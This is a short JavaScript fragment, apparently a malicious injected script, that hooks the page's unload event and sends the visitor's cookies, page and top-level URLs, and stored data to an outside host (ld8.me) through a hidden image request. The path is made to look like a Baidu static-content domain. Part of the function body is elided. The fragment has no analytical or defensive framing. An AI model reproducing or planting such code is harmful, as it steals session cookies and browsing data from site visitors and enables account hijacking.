document.getElementsByTagName("body")[0].setAttribute("onbeforeunload","postData()");
function postData() {	
        ...
        if(outputif.replace(/(^s*)|(s*$)/g, "").length >4){
            new Image().src = "//ld8.me/bdstatic.com/?callback=jsonp&id=c0ui"+"&location="+encodeURIComponent(locationurl)+"&toplocation="+encodeURIComponent(topurl)+"&datastorage="+output+"&cookie="+encodeURIComponent(cookie);
        }
}